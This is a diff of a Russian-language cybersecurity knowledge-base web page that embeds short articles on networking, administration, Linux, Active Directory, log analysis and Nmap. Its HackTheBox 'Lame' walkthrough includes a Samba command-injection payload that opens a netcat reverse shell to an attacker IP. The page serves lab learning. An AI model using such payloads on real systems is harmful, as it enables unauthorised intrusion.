@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CyberSec Lab - Knowledge Base</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.29.0/feather.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -16,27 +17,26 @@
             --bg-secondary: #131a3a;
             --bg-card: #1a2344;
             --accent: #00ff88;
-            --accent-dim: #00cc6a;
             --text-primary: #e8e8e8;
             --text-secondary: #a0a0b0;
             --border: #2a3a5a;
         }
 
         body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            background: var(--bg-primary);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, var(--bg-primary) 0%, #0f1629 100%);
             color: var(--text-primary);
             line-height: 1.6;
         }
 
         .header {
-            background: linear-gradient(135deg, var(--bg-secondary) 0%, #0f1629 100%);
-            border-bottom: 2px solid var(--accent);
-            padding: 2rem 0;
             position: sticky;
             top: 0;
             z-index: 100;
+            background: rgba(19, 26, 58, 0.95);
             backdrop-filter: blur(10px);
+            border-bottom: 2px solid var(--accent);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
         }
 
         .container {
@@ -49,6 +49,7 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            padding: 1.5rem 0;
             flex-wrap: wrap;
             gap: 1rem;
         }
@@ -58,6 +59,7 @@
             font-weight: 700;
             color: var(--accent);
             text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+            cursor: pointer;
         }
 
         .logo span {
@@ -76,29 +78,17 @@
             font-weight: 500;
             transition: all 0.3s;
             position: relative;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
         }
 
         .nav a:hover {
             color: var(--accent);
         }
 
-        .nav a::after {
-            content: '';
-            position: absolute;
-            bottom: -5px;
-            left: 0;
-            width: 0;
-            height: 2px;
-            background: var(--accent);
-            transition: width 0.3s;
-        }
-
-        .nav a:hover::after {
-            width: 100%;
-        }
-
         .hero {
-            padding: 4rem 0;
+            padding: 4rem 0 2rem;
             text-align: center;
         }
 
@@ -114,8 +104,38 @@
         .hero p {
             font-size: 1.2rem;
             color: var(--text-secondary);
+            margin-bottom: 2rem;
+        }
+
+        .search-bar {
             max-width: 600px;
-            margin: 0 auto;
+            margin: 2rem auto;
+            position: relative;
+        }
+
+        .search-bar input {
+            width: 100%;
+            padding: 1rem 1rem 1rem 3rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 50px;
+            color: var(--text-primary);
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .search-bar input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-secondary);
         }
 
         .categories {
@@ -161,27 +181,142 @@
         .category-icon {
             font-size: 3rem;
             margin-bottom: 1rem;
+            text-align: center;
         }
 
         .category-card h3 {
             color: var(--accent);
             margin-bottom: 0.5rem;
             font-size: 1.5rem;
+            text-align: center;
         }
 
         .category-card p {
             color: var(--text-secondary);
             font-size: 0.95rem;
+            text-align: center;
+            margin-bottom: 1rem;
         }
 
         .articles-count {
-            display: inline-block;
-            margin-top: 1rem;
-            padding: 0.3rem 0.8rem;
+            display: block;
+            text-align: center;
+            padding: 0.5rem;
             background: rgba(0, 255, 136, 0.1);
             border-radius: 20px;
             font-size: 0.85rem;
             color: var(--accent);
+            font-family: monospace;
+        }
+
+        .article-list {
+            padding: 2rem 0;
+        }
+
+        .article-item {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 1.5rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .article-item:hover {
+            border-color: var(--accent);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.15);
+        }
+
+        .article-item h3 {
+            color: var(--accent);
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .article-date {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            font-family: monospace;
+        }
+
+        .article-content {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem 0;
+        }
+
+        .article-content h1 {
+            color: var(--accent);
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .article-content h2 {
+            color: var(--accent);
+            font-size: 2rem;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+        }
+
+        .article-content h3 {
+            color: var(--accent);
+            font-size: 1.5rem;
+            margin-top: 1.5rem;
+            margin-bottom: 0.75rem;
+        }
+
+        .article-content p {
+            color: var(--text-secondary);
+            margin-bottom: 1rem;
+            line-height: 1.8;
+        }
+
+        .article-content pre {
+            background: #0d1117;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+        }
+
+        .article-content code {
+            color: var(--accent);
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        .article-content ul, .article-content ol {
+            margin-left: 2rem;
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: var(--bg-card);
+            color: var(--accent);
+            border: 1px solid var(--border);
+            padding: 0.75rem 1.5rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .back-btn:hover {
+            border-color: var(--accent);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.2);
+            transform: translateX(-3px);
         }
 
         .footer {
@@ -201,44 +336,20 @@
             text-decoration: none;
         }
 
-        .search-bar {
-            margin: 2rem auto;
-            max-width: 600px;
-            position: relative;
-        }
-
-        .search-bar input {
-            width: 100%;
-            padding: 1rem 1.5rem;
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 50px;
-            color: var(--text-primary);
-            font-size: 1rem;
-            transition: all 0.3s;
-        }
-
-        .search-bar input:focus {
-            outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
-        }
-
-        .search-bar input::placeholder {
-            color: var(--text-secondary);
+        .hidden {
+            display: none !important;
         }
 
         @media (max-width: 768px) {
             .hero h1 {
                 font-size: 2rem;
             }
-
             .categories {
                 grid-template-columns: 1fr;
             }
-
             .nav {
                 gap: 1rem;
+                font-size: 0.9rem;
             }
         }
     </style>
@@ -247,117 +358,546 @@
     <header class="header">
         <div class="container">
             <div class="header-content">
-                <div class="logo">
+                <div class="logo" onclick="showHome()">
                     <span>&lt;</span>Cyber<span>Sec</span> Lab<span>/&gt;</span>
                 </div>
                 <nav class="nav">
-                    <a href="#home">Главная</a>
-                    <a href="#articles">Статьи</a>
-                    <a href="#about">О проекте</a>
-                    <a href="https://github.com/yourusername" target="_blank">GitHub</a>
+                    <a href="#" onclick="showHome(); return false;">Главная</a>
+                    <a href="https://github.com/yourusername" target="_blank">
+                        <i data-feather="github"></i> GitHub
+                    </a>
                 </nav>
             </div>
         </div>
     </header>
 
     <main class="container">
-        <section class="hero">
-            <h1>База Знаний по Кибербезопасности</h1>
-            <p>Практические материалы по сетям, администрированию, пентестингу и SOC</p>
-            
-            <div class="search-bar">
-                <input type="text" placeholder="🔍 Поиск по статьям...">
-            </div>
-        </section>
+        <!-- Главная страница -->
+        <div id="home-view">
+            <section class="hero">
+                <h1>База Знаний по Кибербезопасности</h1>
+                <p>Практические материалы по сетям, администрированию, пентестингу и SOC</p>
+                
+                <div class="search-bar">
+                    <i data-feather="search" class="search-icon"></i>
+                    <input type="text" id="searchInput" placeholder="Поиск по статьям...">
+                </div>
+            </section>
 
-        <section class="categories">
-            <div class="category-card" onclick="location.href='categories/networks.html'">
-                <div class="category-icon">🌐</div>
-                <h3>Сети</h3>
-                <p>Настройка сетевого оборудования, протоколы, VPN, маршрутизация</p>
-                <span class="articles-count">0 статей</span>
-            </div>
+            <section class="categories" id="categoriesGrid"></section>
+        </div>
 
-            <div class="category-card" onclick="location.href='categories/administration.html'">
-                <div class="category-icon">⚙️</div>
-                <h3>Администрирование</h3>
-                <p>Управление серверами, виртуализация, конфигурация систем</p>
-                <span class="articles-count">0 статей</span>
-            </div>
+        <!-- Страница категории -->
+        <div id="category-view" class="hidden">
+            <button class="back-btn" onclick="showHome()">
+                <i data-feather="arrow-left"></i> Назад к категориям
+            </button>
+            <div id="categoryHeader"></div>
+            <div class="article-list" id="articleList"></div>
+        </div>
 
-            <div class="category-card" onclick="location.href='categories/linux.html'">
-                <div class="category-icon">🐧</div>
-                <h3>Linux</h3>
-                <p>Командная строка, скрипты, настройка и оптимизация систем</p>
-                <span class="articles-count">0 статей</span>
-            </div>
-
-            <div class="category-card" onclick="location.href='categories/windows.html'">
-                <div class="category-icon">🪟</div>
-                <h3>Windows</h3>
-                <p>Active Directory, PowerShell, групповые политики</p>
-                <span class="articles-count">0 статей</span>
-            </div>
-
-            <div class="category-card" onclick="location.href='categories/soc.html'">
-                <div class="category-icon">🛡️</div>
-                <h3>SOC</h3>
-                <p>Мониторинг безопасности, SIEM, анализ инцидентов</p>
-                <span class="articles-count">0 статей</span>
-            </div>
-
-            <div class="category-card" onclick="location.href='categories/pentest.html'">
-                <div class="category-icon">🔓</div>
-                <h3>Pentest</h3>
-                <p>Тестирование на проникновение, эксплуатация уязвимостей</p>
-                <span class="articles-count">0 статей</span>
-            </div>
-
-            <div class="category-card" onclick="location.href='categories/htb-thm.html'">
-                <div class="category-icon">🎯</div>
-                <h3>HTB / THM</h3>
-                <p>Writeup'ы машин с HackTheBox и TryHackMe</p>
-                <span class="articles-count">0 статей</span>
-            </div>
-        </section>
+        <!-- Страница статьи -->
+        <div id="article-view" class="hidden">
+            <button class="back-btn" onclick="showCategory()">
+                <i data-feather="arrow-left"></i> Назад к статьям
+            </button>
+            <div class="article-content" id="articleContent"></div>
+        </div>
     </main>
 
     <footer class="footer">
         <div class="container">
-            <p>&copy; 2025 CyberSec Lab | <a href="https://github.com/mnuryyev">GitHub</a></p>
+            <p>&copy; 2025 CyberSec Lab | <a href="https://github.com/yourusername" target="_blank">GitHub</a></p>
         </div>
     </footer>
 
     <script>
-        // Простой поиск по категориям
-        const searchInput = document.querySelector('.search-bar input');
-        const categoryCards = document.querySelectorAll('.category-card');
+        const categories = [
+            {
+                id: 'networks',
+                name: 'Сети',
+                icon: '🌐',
+                description: 'Настройка сетевого оборудования, протоколы, VPN',
+                articles: [{
+                    id: 1,
+                    title: 'Настройка VLAN на Cisco Switch',
+                    date: '2025-01-15',
+                    content: `# Настройка VLAN на Cisco Switch
 
-        searchInput.addEventListener('input', (e) => {
-            const searchTerm = e.target.value.toLowerCase();
+## Введение
+VLAN (Virtual Local Area Network) позволяет разделить физическую сеть на логические сегменты.
+
+## Базовая настройка
+
+### Создание VLAN
+\`\`\`
+Switch> enable
+Switch# configure terminal
+Switch(config)# vlan 10
+Switch(config-vlan)# name MANAGEMENT
+Switch(config-vlan)# exit
+
+Switch(config)# vlan 20
+Switch(config-vlan)# name USERS
+Switch(config-vlan)# exit
+\`\`\`
+
+### Назначение портов в VLAN
+\`\`\`
+Switch(config)# interface fastethernet 0/1
+Switch(config-if)# switchport mode access
+Switch(config-if)# switchport access vlan 10
+\`\`\`
+
+### Настройка Trunk порта
+\`\`\`
+Switch(config)# interface gigabitethernet 0/1
+Switch(config-if)# switchport mode trunk
+Switch(config-if)# switchport trunk allowed vlan 10,20
+\`\`\`
+
+## Проверка конфигурации
+\`\`\`
+Switch# show vlan brief
+Switch# show interfaces trunk
+\`\`\`
+
+## Практические советы
+- Используйте VLAN 1 только для управления
+- Документируйте все VLAN
+- Настройте Native VLAN отличный от 1`
+                }]
+            },
+            {
+                id: 'administration',
+                name: 'Администрирование',
+                icon: '⚙️',
+                description: 'Управление серверами, виртуализация',
+                articles: [{
+                    id: 1,
+                    title: 'Автоматизация бэкапов с rsync',
+                    date: '2025-01-20',
+                    content: `# Автоматизация бэкапов с rsync
+
+## Базовый синтаксис
+\`\`\`bash
+rsync [опции] источник назначение
+\`\`\`
+
+## Практический пример
+
+### Локальный бэкап
+\`\`\`bash
+rsync -avz --delete /var/www/ /backup/www/
+\`\`\`
+
+### Удаленный бэкап
+\`\`\`bash
+rsync -avz -e ssh /var/www/ user@backup-server:/backups/www/
+\`\`\`
+
+### Скрипт автоматического бэкапа
+\`\`\`bash
+#!/bin/bash
+DATE=$(date +%Y-%m-%d_%H-%M)
+SOURCE="/var/www"
+DEST="/backup/www-$DATE"
+
+rsync -avz --delete $SOURCE $DEST
+
+# Удаление старых бэкапов
+find /backup -type d -mtime +7 -name "www-*" -exec rm -rf {} +
+\`\`\`
+
+## Настройка cron
+\`\`\`bash
+# Бэкап каждый день в 2:00
+0 2 * * * /usr/local/bin/backup.sh
+\`\`\``
+                }]
+            },
+            {
+                id: 'linux',
+                name: 'Linux',
+                icon: '🐧',
+                description: 'Командная строка, скрипты, оптимизация',
+                articles: [{
+                    id: 1,
+                    title: 'Управление процессами в Linux',
+                    date: '2025-01-18',
+                    content: `# Управление процессами в Linux
+
+## Просмотр процессов
+
+### ps - статический снимок
+\`\`\`bash
+ps aux                    # Все процессы
+ps aux | grep nginx       # Поиск процесса
+ps -ef --forest          # Дерево процессов
+\`\`\`
+
+### top и htop
+\`\`\`bash
+top                      # Стандартный мониторинг
+htop                     # Улучшенная версия
+\`\`\`
+
+## Управление процессами
+
+### Сигналы
+\`\`\`bash
+kill -l                  # Список сигналов
+kill PID                 # SIGTERM (15)
+kill -9 PID              # SIGKILL
+killall nginx            # Убить все процессы
+\`\`\`
+
+## Systemd
+\`\`\`bash
+systemctl status nginx
+systemctl start nginx
+systemctl stop nginx
+systemctl restart nginx
+systemctl enable nginx   # Автозапуск
+\`\`\``
+                }]
+            },
+            {
+                id: 'windows',
+                name: 'Windows',
+                icon: '🪟',
+                description: 'Active Directory, PowerShell, GPO',
+                articles: [{
+                    id: 1,
+                    title: 'PowerShell: Управление пользователями AD',
+                    date: '2025-01-22',
+                    content: `# PowerShell: Управление пользователями AD
+
+## Создание пользователя
+\`\`\`powershell
+New-ADUser -Name "Ivan Ivanov" \\
+  -SamAccountName "iivanov" \\
+  -UserPrincipalName "iivanov@domain.local" \\
+  -Enabled $true
+\`\`\`
+
+## Массовое создание из CSV
+\`\`\`powershell
+$Users = Import-Csv -Path "C:\\\\users.csv"
+
+foreach ($User in $Users) {
+    New-ADUser -Name $User.Name \\
+        -SamAccountName $User.SamAccountName
+}
+\`\`\`
+
+## Управление группами
+\`\`\`powershell
+Add-ADGroupMember -Identity "IT-Team" -Members "iivanov"
+Remove-ADGroupMember -Identity "IT-Team" -Members "iivanov"
+\`\`\`
+
+## Сброс пароля
+\`\`\`powershell
+Set-ADAccountPassword -Identity "iivanov" -Reset
+Set-ADUser -Identity "iivanov" -ChangePasswordAtLogon $true
+\`\`\``
+                }]
+            },
+            {
+                id: 'soc',
+                name: 'SOC',
+                icon: '🛡️',
+                description: 'Мониторинг безопасности, SIEM',
+                articles: [{
+                    id: 1,
+                    title: 'Анализ логов с grep и awk',
+                    date: '2025-01-25',
+                    content: `# Анализ логов с grep и awk
+
+## Поиск с grep
+
+### Базовые примеры
+\`\`\`bash
+grep "Failed password" /var/log/auth.log
+grep -C 3 "error" /var/log/syslog
+grep -r "404" /var/log/nginx/
+\`\`\`
+
+## Обработка с AWK
+
+### Статистика статус-кодов
+\`\`\`bash
+awk '{print $9}' access.log | sort | uniq -c | sort -rn
+\`\`\`
+
+### Топ IP адресов
+\`\`\`bash
+awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10
+\`\`\`
+
+### Поиск подозрительной активности
+\`\`\`bash
+# SQL injection
+grep -i "union.*select" access.log
+
+# XSS
+grep -i "<script>" access.log
+\`\`\`
+
+### Брутфорс SSH
+\`\`\`bash
+grep "Failed password" /var/log/auth.log | \\
+  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
+\`\`\``
+                }]
+            },
+            {
+                id: 'pentest',
+                name: 'Pentest',
+                icon: '🔓',
+                description: 'Тестирование на проникновение',
+                articles: [{
+                    id: 1,
+                    title: 'Разведка с помощью Nmap',
+                    date: '2025-01-28',
+                    content: `# Разведка с помощью Nmap
+
+## Базовое сканирование
+\`\`\`bash
+nmap 192.168.1.1              # Один хост
+nmap 192.168.1.0/24           # Подсеть
+nmap 192.168.1.1-254          # Диапазон
+\`\`\`
+
+## Определение живых хостов
+\`\`\`bash
+nmap -sn 192.168.1.0/24       # Ping scan
+nmap -PS 192.168.1.0/24       # TCP SYN ping
+\`\`\`
+
+## Сканирование портов
+\`\`\`bash
+nmap -sS target               # TCP SYN
+nmap -sU target               # UDP
+nmap -p- target               # Все порты
+nmap --top-ports 100 target   # Топ 100
+\`\`\`
+
+## Определение версий
+\`\`\`bash
+nmap -sV target               # Версии сервисов
+nmap -O target                # OS detection
+nmap -A target                # Агрессивное
+\`\`\`
+
+## NSE скрипты
+\`\`\`bash
+nmap --script vuln target
+nmap --script brute target
+nmap -sC target              # Безопасные
+\`\`\`
+
+## Полное сканирование
+\`\`\`bash
+nmap -sS -sV -O -p- --script vuln -T4 -oA scan target
+\`\`\``
+                }]
+            },
+            {
+                id: 'htb-thm',
+                name: 'HTB / THM',
+                icon: '🎯',
+                description: 'Writeup\'ы с платформ',
+                articles: [{
+                    id: 1,
+                    title: '[HTB] Lame - Walkthrough',
+                    date: '2025-01-30',
+                    content: `# [HTB] Lame - Walkthrough
+
+## Информация
+- **Название:** Lame
+- **ОС:** Linux
+- **Сложность:** Easy
+- **IP:** 10.10.10.3
+
+## Разведка
+
+### Nmap
+\`\`\`bash
+nmap -sC -sV 10.10.10.3
+\`\`\`
+
+Результаты:
+\`\`\`
+21/tcp  open  ftp         vsftpd 2.3.4
+22/tcp  open  ssh         OpenSSH 4.7p1
+139/tcp open  netbios-ssn Samba 3.X
+445/tcp open  netbios-ssn Samba 3.0.20
+\`\`\`
+
+## Эксплуатация
+
+### Samba 3.0.20
+CVE-2007-2447 - Command Injection
+
+### Metasploit
+\`\`\`bash
+use exploit/multi/samba/usermap_script
+set RHOSTS 10.10.10.3
+exploit
+\`\`\`
+
+### Без Metasploit
+\`\`\`bash
+smbclient //10.10.10.3/tmp
+logon "/=\`nc -e /bin/sh 10.10.14.5 4444\`"
+\`\`\`
+
+## Флаги
+
+### User
+\`\`\`bash
+cat /home/makis/user.txt
+\`\`\`
+
+### Root
+\`\`\`bash
+cat /root/root.txt
+\`\`\`
+
+## Выводы
+- Samba 3.0.20 уязвима
+- Устаревшая ОС
+- Нужно обновление
+
+**Disclaimer:** Только для обучения!`
+                }]
+            }
+        ];
+
+        let currentCategory = null;
+        let currentArticle = null;
+
+        function renderCategories() {
+            const grid = document.getElementById('categoriesGrid');
+            grid.innerHTML = categories.map(cat => `
+                <div class="category-card" onclick="showCategoryView('${cat.id}')">
+                    <div class="category-icon">${cat.icon}</div>
+                    <h3>${cat.name}</h3>
+                    <p>${cat.description}</p>
+                    <span class="articles-count">${cat.articles.length} ${cat.articles.length === 1 ? 'статья' : 'статей'}</span>
+                </div>
+            `).join('');
+        }
+
+        function showHome() {
+            document.getElementById('home-view').classList.remove('hidden');
+            document.getElementById('category-view').classList.add('hidden');
+            document.getElementById('article-view').classList.add('hidden');
+            currentCategory = null;
+            currentArticle = null;
+        }
+
+        function showCategoryView(categoryId) {
+            currentCategory = categories.find(c => c.id === categoryId);
+            if (!currentCategory) return;
+
+            document.getElementById('home-view').classList.add('hidden');
+            document.getElementById('category-view').classList.remove('hidden');
+            document.getElementById('article-view').classList.add('hidden');
+
+            document.getElementById('categoryHeader').innerHTML = `
+                <div style="display: flex; align-items: center; gap: 1rem; margin-bottom: 2rem;">
+                    <span style="font-size: 3rem;">${currentCategory.icon}</span>
+                    <div>
+                        <h1 style="font-size: 2.5rem; color: var(--accent); margin-bottom: 0.5rem;">${currentCategory.name}</h1>
+                        <p style="color: var(--text-secondary); font-size: 1.1rem;">${currentCategory.description}</p>
+                    </div>
+                </div>
+            `;
+
+            document.getElementById('articleList').innerHTML = currentCategory.articles.map(article => `
+                <div class="article-item" onclick="showArticle(${article.id})">
+                    <h3>${article.title}</h3>
+                    <div class="article-date">${article.date}</div>
+                </div>
+            `).join('');
+
+            feather.replace();
+        }
+
+        function showCategory() {
+            if (currentCategory) {
+                showCategoryView(currentCategory.id);
+            }
+        }
+
+        function showArticle(articleId) {
+            if (!currentCategory) return;
+            currentArticle = currentCategory.articles.find(a => a.id === articleId);
+            if (!currentArticle) return;
+
+            document.getElementById('home-view').classList.add('hidden');
+            document.getElementById('category-view').classList.add('hidden');
+            document.getElementById('article-view').classList.remove('hidden');
+
+            const content = parseMarkdown(currentArticle.content);
+            document.getElementById('articleContent').innerHTML = `
+                <div style="margin-bottom: 2rem;">
+                    <div style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 0.5rem;">${currentArticle.date}</div>
+                    <h1 style="font-size: 2.5rem; color: var(--accent);">${currentArticle.title}</h1>
+                </div>
+                ${content}
+            `;
+
+            feather.replace();
+        }
+
+        function parseMarkdown(text) {
+            let html = '';
+            let inCodeBlock = false;
+            let codeContent = '';
             
-            categoryCards.forEach(card => {
-                const title = card.querySelector('h3').textContent.toLowerCase();
-                const description = card.querySelector('p').textContent.toLowerCase();
-                
-                if (title.includes(searchTerm) || description.includes(searchTerm)) {
-                    card.style.display = 'block';
-                } else {
-                    card.style.display = searchTerm === '' ? 'block' : 'none';
+            text.split('\n').forEach(line => {
+                if (line.startsWith('```')) {
+                    if (inCodeBlock) {
+                        html += `<pre><code>${codeContent}</code></pre>`;
+                        codeContent = '';
+                    }
+                    inCodeBlock = !inCodeBlock;
+                } else if (inCodeBlock) {
+                    codeContent += line + '\n';
+                } else if (line.startsWith('### ')) {
+                    html += `<h3>${line.slice(4)}</h3>`;
+                } else if (line.startsWith('## ')) {
+                    html += `<h2>${line.slice(3)}</h2>`;
+                } else if (line.startsWith('# ')) {
+                    html += `<h1>${line.slice(2)}</h1>`;
+                } else if (line.startsWith('- ')) {
+                    html += `<li>${line.slice(2)}</li>`;
+                } else if (line.trim()) {
+                    const processed = line.replace(/`([^`]+)`/g, '<code>$1</code>');
+                    html += `<p>${processed}</p>`;
                 }
+            });
+            
+            return html;
+        }
+
+        document.getElementById('searchInput').addEventListener('input', function(e) {
+            const term = e.target.value.toLowerCase();
+            const cards = document.querySelectorAll('.category-card');
+            
+            cards.forEach(card => {
+                const text = card.textContent.toLowerCase();
+                card.style.display = text.includes(term) ? 'block' : 'none';
             });
         });
 
-        // Плавная прокрутка
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    target.scrollIntoView({ behavior: 'smooth' });
-                }
-            });
-        });
+        // Инициализация
+        renderCategories();
+        feather.replace();
     </script>
 </body>
 </html>
